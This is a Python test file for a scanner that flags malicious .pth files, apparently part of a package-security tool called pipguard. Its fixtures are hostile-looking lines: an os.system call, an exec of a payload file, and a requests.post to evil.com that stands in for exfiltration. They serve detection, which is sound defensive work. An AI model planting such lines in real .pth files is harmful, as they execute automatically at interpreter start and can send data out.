"""Tests for pth_detector."""

from pathlib import Path
import tempfile

from pipguard.detectors.pth_detector import detect_pth


def _write_pth(content: str) -> Path:
    f = tempfile.NamedTemporaryFile(suffix=".pth", mode="w", delete=False)
    f.write(content)
    f.close()
    return Path(f.name)


class TestPthDetector:
    def test_clean_pth_no_findings(self):
        path = _write_pth("/usr/lib/python3/extras\n./local_packages\n")
        findings = detect_pth(path)
        assert findings == []

    def test_import_line_flagged(self):
        path = _write_pth("import os; os.system('whoami')\n")
        findings = detect_pth(path)
        assert len(findings) >= 1
        assert findings[0].rule_id == "PTH-EXEC"
        assert findings[0].severity in ("high", "critical")

    def test_exec_eval_flagged(self):
        path = _write_pth("exec(open('/tmp/payload.py').read())\n")
        findings = detect_pth(path)
        assert len(findings) >= 1
        assert findings[0].rule_id == "PTH-EXEC"

    def test_network_pattern_flagged(self):
        path = _write_pth("import requests; requests.post('http://evil.com', data={})\n")
        findings = detect_pth(path)
        assert len(findings) >= 1

    def test_comment_lines_ignored(self):
        path = _write_pth("# This is a comment\n# import os\n/usr/lib/python3\n")
        findings = detect_pth(path)
        assert findings == []

    def test_multiple_suspicious_lines_critical(self):
        content = "import os\nexec(open('x').read())\n"
        path = _write_pth(content)
        findings = detect_pth(path)
        assert any(f.severity == "critical" for f in findings)
